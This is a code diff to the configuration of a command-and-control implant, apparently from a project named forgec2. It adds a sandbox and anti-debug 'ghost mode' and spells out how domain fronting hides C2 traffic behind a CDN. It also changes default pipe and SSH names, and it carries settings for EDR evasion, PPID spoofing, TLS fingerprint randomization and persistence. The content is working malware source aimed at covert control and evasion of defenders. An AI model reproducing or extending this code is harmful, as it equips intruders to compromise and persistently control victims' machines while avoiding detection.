@@ -13,6 +13,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"sync/atomic"
 	"time"
 
 	"github.com/forgec2/forgec2/pkg/protocol"
@@ -23,8 +24,8 @@ import (
 // IMPORTANT: -X can ONLY set string variables. Non-strings are injected as *Str and parsed in init().
 var (
 	C2URL                   string            = s(SC2DefaultURL)
-	C2URLs                  []string          // parsed from C2URL (comma-separated multi-C2 failover)
-	currentC2Idx            int               // index of last working C2 server
+	c2URLsAtomic            atomic.Value      // immutable snapshot of C2 URLs (published via c2URLsStore)
+	currentC2Idx            atomic.Int32      // index of last working C2 server (atomic: read by screenshot goroutine, written by C2 senders)
 	IntervalStr             string            = "10"
 	JitterStr               string            = "20"
 	UserAgent               string            = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
@@ -53,7 +54,7 @@ var (
 	RegSecretIDStr          string            = ""                            // v3: per-implant registration secret id ("" = v2 master-key derivation)
 	RegSecretStr            string            = ""                            // v3: per-implant registration secret, base64 ("" = v2 master-key derivation)
 	P2PSharedSecret         string            = ""                            // P2P relay pre-shared key (base64 32 bytes). Build pipelines stamp this via -ldflags so parent + child implants share a mesh key. "" = no P2P auth (legacy)
-	DomainFront             string            = ""                            // Domain fronting: override HTTP Host header ("" = disabled)
+	DomainFront             string            = ""                            // Domain fronting: when set, the TLS SNI (via uTLS) and HTTP Host header both present this domain while the connection still egresses to C2URL. Point C2URL at the CDN/proxy edge and set DomainFront to the fronted hostname so passive observers (and the CDN) see only the fronted domain. "" = disabled
 	ContentLengthJitter     int               = 0                             // Max random padding bytes for HTTP body (0=disabled)
 	MalleablePrepend        string            = ""                            // bytes prepended to every HTTP beacon response body (server malleable profile)
 	// MalleableRespDecode holds the serialized output transforms (e.g.
@@ -68,15 +69,16 @@ var (
 	MalleableRequestHeaders map[string]string = nil                           // extra request headers sent on outbound beacons (e.g. Host/Cookie shaping)
 	ExpiryDateStr           string            = ""                            // Compile-time expiry date: "YYYY-MM-DD" — implant auto-exits after this date
 	EvasionStr              string            = "false"                       // Compile-time EDR evasion (chunked sleep); also FORGEC2_EVASION=1 at runtime
+	GhostModeStr            string            = "false"                       // Compile-time ghost protocol (sandbox/anti-debug deep-hiding); also FORGEC2_GHOST_MODE=1 at runtime
 	PPIDSpoofStr            string            = "false"                       // Compile-time PPID spoofing (spawned processes inherit the configured parent as parent)
 	PPIDSpoofParent         string            = "explorer.exe"                // Parent process name used for PPID spoofing (e.g. explorer.exe, svchost.exe, runtimebroker.exe)
 	PersistencePrefixStr    string            = ""                            // Custom prefix for persistence artifacts (reg keys, task names, file names); default "ForgeC2"
 	BeaconTransportStr      string            = "http"                        // "http", "wss", "ssh" — transport protocol for beacon
 	ChameleonStr            string            = "true"                        // enable uTLS TLS fingerprint randomization (requires chameleon build tag)
 	ChameleonProfileStr     string            = "random"                      // chrome, firefox, ios, android, random
-	SMBPipeName             string            = "forgec2"                     // named pipe name for SMB transport
+	SMBPipeName             string            = ""                            // named pipe name for SMB transport (defaults to persistencePrefix)
 	IsSMBParentStr          string            = "false"                       // "true" = this agent is an SMB parent (listens on pipe)
-	SSHUserStr              string            = "forgec2"                     // SSH username for SSH transport
+	SSHUserStr              string            = ""                            // SSH username for SSH transport (defaults to persistencePrefix)
 	SSHPasswordStr          string            = ""                            // SSH password for SSH transport
 	SSHKeyStr               string            = ""                            // base64-encoded PEM private key for SSH transport
 	SSHHostKeyStr           string            = ""                            // base64 server host public key (pin); empty = SSH transport refuses to connect
@@ -131,6 +133,7 @@ var (
 	ListenerID       uint
 	BeaconTransport  string
 	evasionEnabled   bool
+	ghostModeEnabled bool
 	chameleonEnabled bool
 	chameleonProfile string
 	isSMBParent      bool
@@ -188,6 +191,7 @@ type agentConfigBlob struct {
 	RegSecret        string `json:"reg_secret"`
 	ExpiryDate       string `json:"expiry"`
 	Evasion          string `json:"evasion"`
+	GhostMode        string `json:"ghost_mode"`
 	DomainFront      string `json:"domain_front"`
 	WorkingStart     string `json:"work_start"`
 	WorkingEnd       string `json:"work_end"`
@@ -453,6 +457,9 @@ func (b *agentConfigBlob) apply() {
 	}
 	if b.Evasion != "" {
 		EvasionStr = b.Evasion
+	}
+	if b.GhostMode != "" {
+		GhostModeStr = b.GhostMode
 	}
 	if b.DomainFront != "" {
 		DomainFront = b.DomainFront
